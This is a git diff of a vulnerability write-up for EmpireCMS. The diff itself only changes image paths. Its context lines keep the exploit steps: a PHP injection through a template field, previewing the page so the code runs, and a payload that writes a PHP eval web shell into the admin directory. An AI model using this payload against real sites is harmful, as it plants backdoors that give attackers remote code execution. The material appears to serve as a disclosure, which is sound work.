@@ -24,19 +24,19 @@ The vulnerability exists in line 425 of tmepfun. Due to the lack of effective va
 Vulnerability verification POC ：<?php phpinf0(); ?>
 ```
 
-![image-20240730104109557](EmpireCMS-Getshell.assets/image-20240730104109557.png)
+![image-20240730104109557](image/image-20240730104109557.png)
 
 2、After submitting, click "预览"：
 
-![image-20240730104436737](EmpireCMS-Getshell.assets/image-20240730104436737.png)
+![image-20240730104436737](image/image-20240730104436737.png)
 
 The injected malicious content is referenced and executed：
 
-![image-20240730104534523](EmpireCMS-Getshell.assets/image-20240730104534523.png)
+![image-20240730104534523](image/image-20240730104534523.png)
 
 3、The server generates indexpage temporary file，The path is：/e/data/tmp/indexpage{tempid}.php
 
-![image-20240730104922561](EmpireCMS-Getshell.assets/image-20240730104922561.png)
+![image-20240730104922561](image/image-20240730104922561.png)
 
 4、POC and change to：
 
@@ -46,8 +46,8 @@ test <?php fputs(fopen('shell.php','w'),'<?php eval($_POST[9527])?>');?>
 
 Automatically generate shell.chp in e/admin
 
-![image-20240730110245130](EmpireCMS-Getshell.assets/image-20240730110245130.png)
+![image-20240730110245130](image/image-20240730110245130.png)
 
 
 
-![image-20240730110005192](EmpireCMS-Getshell.assets/image-20240730110005192.png)
+![image-20240730110005192](image/image-20240730110005192.png)
